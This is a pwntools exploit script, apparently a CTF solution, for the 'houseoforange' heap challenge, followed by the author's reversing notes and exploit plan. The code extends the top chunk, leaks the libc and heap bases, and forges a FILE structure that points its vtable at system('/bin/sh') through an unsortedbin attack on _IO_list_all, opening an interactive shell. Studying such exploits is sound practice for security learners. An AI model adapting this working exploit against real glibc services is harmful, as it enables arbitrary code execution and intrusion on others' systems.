#!/usr/bin/env python3

from pwn import *

exe = ELF("./houseoforange")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def build(length, name, price, color):
    	r.sendline("1")
    	r.recvuntil("Length of name :")
    	r.sendline(str(length))
    	r.recvuntil("Name :")
    	r.send(name)
    	r.recvuntil("Price of Orange:")
    	r.sendline(str(price))
    	r.recvuntil("Color of Orange:")
    	r.sendline(str(color))

    def see():
    	r.sendline("2")

    def upgrade(length, name, price, color):
    	r.sendline("3")
    	r.recvuntil("Length of name :")
    	r.sendline(str(length))
    	r.recvuntil("Name:")
    	r.send(name)
    	r.recvuntil("Price of Orange: ")
    	r.sendline(str(price))
    	r.recvuntil("Color of Orange: ")
    	r.sendline(str(color))

    def exit():
    	r.sendline("4")

    # Top chunk extension

    topchunk_size = 0x1000 - 0x20*3 + 1
    build(0x10, "A"*0x10, 100, 1) # 0 build
    upgrade(64, p64(0)*3 + p64(0x21) + p64(0)*3 + p64(topchunk_size), 100, 1) # 0 upgrade
    build(0x1000, "B"*0x1000, 100, 1) # 1 build
    
    # malloc largebin sized chunk -> sort the free top chunk into a largebin, then get it back with binmap and leak libc and heap ptrs 
    build(0x400, "C"*0x8, 100, 1) # 2 build
    see()
    r.recvuntil("C"*8)
    leak = u64(r.recvn(6) + "\x00\x00")
    libc.address = leak - 0x3c4188
    log.info("libc base address: {}".format(hex(libc.address)))

    upgrade(0x10, "C"*0x10, 100, 1) # 1 upgrade
    see()
    r.recvuntil("C"*0x10)
    leak = u64(r.recvn(6) + "\x00\x00")
    heap = leak - 0x12020c0
    log.info("heap base address: {}".format(hex(heap)))

    flags = "/bin/sh\x00"
    size = 0x61
    fd = 0
    bk = libc.sym._IO_list_all - 0x10

    write_base = 1
    write_ptr = 2
    mode = 0

    vpointer = heap + 0x12025a8
    overflow = libc.sym.system

    upgrade(0x500, "A"*(0x400+0x20) + flags + p64(size) + p64(fd) + p64(bk) + p64(write_base) + p64(write_ptr)+ p64(0)*18 + p32(mode) + p64(0) + p32(0) + p64(overflow) + p64(vpointer), 100, 1)
    r.sendline("1")
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
doesn't have a free funtion -> top chunk extension -> overflow exists to change top chunk size

build
	- 4 allocs?
	- malloc(0x10)
	- asks size and mallocs size. saves this ptr in the previous malloc's chunk. size max 0x1000 // name
	*(void **)(puVar3 + 1) = pvVar4;
	- reads size amount of bytes and puts them in our personal chunk - 0x58 thingies beginning with [1]
	- callocs(1, 8) , stores the Price of Orange there [0] ; [1] stores our color choice + 0x1e OR 0xddaa (dead orange?)
	- save the callocs chunk *(undefined4 **)puVar3 = puVar5;

	puVar3 (malloc 0x10) [0] - puVar5(calloc(1,8)) - [0] - price (this 2 are both 4bytes each)
						 			                 [1] - color
		                 [1] - pvVar4(malloc(size)) // name

	memory : ptr storage 0 
			 name 0
			 price&col 0

			 ptr storage 1
			 price&col 1
			
			 					ptr storage 2
			 					name 2
			 					price&col 2

			 unsortedbin chunk

			 name 1

	- DAT_00303070++ (counter)
	- DAT_00303068 = puVar3;

see
	- checks if there are any houses at all
	- prints name of the house
	- prints price of orange
	- calls rand and does something to the number, a bunch of shifts
	- if color is 0xddaa prints a string, if else checks the color nr and prints it too

upgrade
	- checks to see if we have a house and not over the upgrade counter
	- asks for new size and overwrites DAT_00303068[1] -> overflowwwwwww
	- overwrites price of orange
	- overwrites color 
	- DAT_00303074 = DAT_00303074 + 1;



plan:
- leak libc V
- heap leak - either pointer storage and or unsortedbin or other bins? fast?

I dont think it's the pointer storage because if we could leak it we can overwrite it too which would defeat the purpose of house of orange


- 1) top chunk extension
- 2) unsortedbin attack
- 3) filestream exploitation


!!!!!!!!!!!!! target vpointer. to avoid remaindering, alloc large. it might still work with the first annoying malloc


my technique wouldnt work because I need to control 1) 2 chunks at the same time and 2) I need to be able to have 2 chunks in the unsortedbin at the same time
I still have the remaindering problem, which i can fix with a large alloc

so -> large alloc and traditional house of orange. but...

1) heap leak
2) how to avoid fucking up the bk and fd



combine chain to chain thing and vpointer target
no heap leak
splitting control it and reset pointers in small bin
0x58 size thing

'''